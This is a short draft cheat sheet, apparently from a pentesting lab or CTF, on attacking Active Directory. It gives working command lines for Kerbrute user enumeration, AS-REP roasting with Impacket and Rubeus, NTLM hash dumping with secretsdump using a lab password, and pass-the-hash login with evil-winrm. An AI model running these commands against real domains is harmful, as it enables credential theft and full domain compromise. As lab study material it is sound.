---
description: Draft --work in progress
---

# Active Directory

### Enumeration

#### Kerbrute

```text
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

### AS-REP Roasting

After enumerating users with Kerbrute we can attempt AS-REP Roasting.  When users have the "Does not require Pre-Authentication" flag set we can use this attack to request a ticket without credentials.  

#### Impacket \(remote attack\)

```text
Impacket -- sudo python3 GetNPUsers.py -usersfile users.txt spookysec.local/username
```

#### Rubeus \(if you have access\)

```text
Rubeus.exe asreproast
```

### Dumping Secrets

If you obtain the credentials for the backup account, you may be able to use another tool in impacket \(secretsdump.py\) to dump all NTLM hashes.

```text
python3 secretsdump.py backup:backup2517860@10.10.46.161
```

### Accessing Remote Machines

Once you have the NTLM hashes you can access any machine on the domain using Evil-WinRM

```text
evil-winrm -i 10.10.46.161 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

